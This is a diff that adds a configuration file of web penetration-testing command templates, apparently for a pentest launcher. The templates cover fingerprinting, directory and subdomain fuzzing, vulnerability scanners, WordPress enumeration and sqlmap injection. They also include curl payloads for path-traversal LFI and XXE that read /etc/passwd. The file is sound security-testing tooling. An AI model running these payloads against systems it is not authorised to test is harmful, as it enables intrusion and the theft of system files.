@@ -1,0 +1,158 @@
+category = "web"
+display_name = "Web"
+icon = "󰖟"
+order = 70
+
+[[command]]
+id = "web.whatweb"
+title = "whatweb"
+template = "whatweb http://{target}"
+requires = ["whatweb"]
+tags = ["fingerprint"]
+
+[[command]]
+id = "web.curl.headers"
+title = "curl -I (headers)"
+template = "curl -kI http://{target}"
+requires = ["curl"]
+tags = ["headers"]
+
+[[command]]
+id = "web.curl.tls_headers"
+title = "curl -I https"
+template = "curl -kI https://{target}"
+requires = ["curl"]
+tags = ["headers", "https"]
+
+[[command]]
+id = "web.feroxbuster.common"
+title = "feroxbuster (common)"
+template = "feroxbuster -u http://{target} -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,asp,aspx,html,txt,js -t 50 -s 200,204,301,302,307,401,403"
+requires = ["feroxbuster"]
+tags = ["fuzz", "dirbuster"]
+
+[[command]]
+id = "web.feroxbuster.deep"
+title = "feroxbuster — raft-medium"
+template = "feroxbuster -u http://{target} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -t 100"
+requires = ["feroxbuster"]
+tags = ["fuzz", "deep"]
+
+[[command]]
+id = "web.ffuf.dirs"
+title = "ffuf — directories"
+template = "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50"
+requires = ["ffuf"]
+tags = ["fuzz"]
+
+[[command]]
+id = "web.ffuf.vhost"
+title = "ffuf — vhost fuzz"
+template = "ffuf -u http://{target} -H 'Host: FUZZ.{hostname}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"
+requires = ["ffuf"]
+tags = ["fuzz", "vhost"]
+
+[[command]]
+id = "web.ffuf.subdomain"
+title = "ffuf — subdomain fuzz"
+template = "ffuf -u http://FUZZ.{hostname} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+requires = ["ffuf"]
+tags = ["fuzz", "subdomain"]
+
+[[command]]
+id = "web.ffuf.params"
+title = "ffuf — parameter fuzz"
+template = "ffuf -u 'http://{target}/page.php?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0"
+requires = ["ffuf"]
+tags = ["fuzz", "params"]
+
+[[command]]
+id = "web.gobuster.dirs"
+title = "gobuster dir"
+template = "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,html,txt -t 50"
+requires = ["gobuster"]
+tags = ["fuzz", "dirbuster"]
+
+[[command]]
+id = "web.gobuster.dns"
+title = "gobuster dns"
+template = "gobuster dns -d {hostname} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100"
+requires = ["gobuster"]
+tags = ["fuzz", "subdomain"]
+
+[[command]]
+id = "web.nikto"
+title = "nikto"
+template = "nikto -h http://{target} -ssl -nointeractive"
+requires = ["nikto"]
+tags = ["scanner", "vuln"]
+
+[[command]]
+id = "web.nuclei"
+title = "nuclei (default templates)"
+template = "nuclei -u http://{target} -severity medium,high,critical"
+requires = ["nuclei"]
+tags = ["scanner", "vuln"]
+
+[[command]]
+id = "web.wpscan.full"
+title = "wpscan (full enumerate)"
+template = "wpscan --url http://{target} --enumerate ap,at,tt,cb,dbe,u,m --api-token YOUR_API_TOKEN"
+requires = ["wpscan"]
+tags = ["wordpress"]
+
+[[command]]
+id = "web.sqlmap.url"
+title = "sqlmap (URL)"
+template = "sqlmap -u 'http://{target}/page.php?id=1' --batch --risk=2 --level=3"
+requires = ["sqlmap"]
+tags = ["sqli"]
+
+[[command]]
+id = "web.sqlmap.dbs"
+title = "sqlmap — list databases"
+template = "sqlmap -u 'http://{target}/page.php?id=1' --batch --dbs"
+requires = ["sqlmap"]
+tags = ["sqli"]
+
+[[command]]
+id = "web.curl.lfi_payload"
+title = "curl LFI test"
+template = "curl -k 'http://{target}/index.php?page=../../../../etc/passwd'"
+requires = ["curl"]
+tags = ["lfi"]
+
+[[command]]
+id = "web.curl.xxe_payload"
+title = "curl XXE proof"
+template = """curl -k -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>' http://{target}/api"""
+requires = ["curl"]
+tags = ["xxe"]
+
+[[command]]
+id = "web.dirsearch"
+title = "dirsearch"
+template = "dirsearch -u http://{target} -e php,asp,aspx,html,js -t 50"
+requires = ["dirsearch"]
+tags = ["fuzz"]
+
+[[command]]
+id = "web.katana.crawl"
+title = "katana crawl"
+template = "katana -u http://{target} -d 3 -jc -aff -kf all"
+requires = ["katana"]
+tags = ["crawl"]
+
+[[command]]
+id = "web.httpx.fingerprint"
+title = "httpx fingerprint + tech"
+template = "echo {target} | httpx -title -status-code -tech-detect -follow-redirects"
+requires = ["httpx"]
+tags = ["fingerprint"]
+
+[[command]]
+id = "web.gowitness.screenshot"
+title = "gowitness — screenshot"
+template = "gowitness single -u http://{target}"
+requires = ["gowitness"]
+tags = ["screenshot"]
